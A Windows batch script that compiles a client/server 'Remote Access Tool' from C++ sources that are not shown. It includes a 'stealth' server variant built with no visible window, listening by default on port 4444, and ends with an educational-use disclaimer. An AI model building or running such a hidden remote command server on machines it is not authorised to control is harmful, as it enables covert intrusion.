@echo off
echo ========================================
echo Remote Access Tool - Build Script
echo ========================================
echo.

echo Checking for MinGW-w64...
g++ --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: MinGW-w64 not found!
    echo Please install MinGW-w64 and add it to PATH
    echo Download from: https://www.mingw-w64.org/
    pause
    exit /b 1
)

echo MinGW-w64 found!
echo.

echo Building server...
g++ -std=c++11 -Wall -O2 -o server.exe server.cpp -lws2_32
if %errorlevel% neq 0 (
    echo ERROR: Failed to build server!
    pause
    exit /b 1
)
echo Server built successfully!

echo Building client...
g++ -std=c++11 -Wall -O2 -o client.exe client.cpp -lws2_32
if %errorlevel% neq 0 (
    echo ERROR: Failed to build client!
    pause
    exit /b 1
)
echo Client built successfully!

echo.
echo Building stealth server...
g++ -std=c++11 -Wall -O2 -DSTEALTH_MODE -mwindows -o server-stealth.exe server.cpp -lws2_32
if %errorlevel% neq 0 (
    echo WARNING: Failed to build stealth server!
) else (
    echo Stealth server built successfully!
)

echo.
echo ========================================
echo BUILD COMPLETE!
echo ========================================
echo.
echo Files created:
if exist server.exe echo   - server.exe (main server)
if exist client.exe echo   - client.exe (client)
if exist server-stealth.exe echo   - server-stealth.exe (hidden server)
echo.
echo Usage:
echo   Server: server.exe [port]
echo   Client: client.exe [server_ip] [port]
echo   Default port: 4444
echo   Default IP: 127.0.0.1
echo.
echo Example:
echo   1. Run: server.exe
echo   2. Run: client.exe
echo   3. Type commands in client
echo.
echo WARNING: Use only for educational purposes!
echo.
pause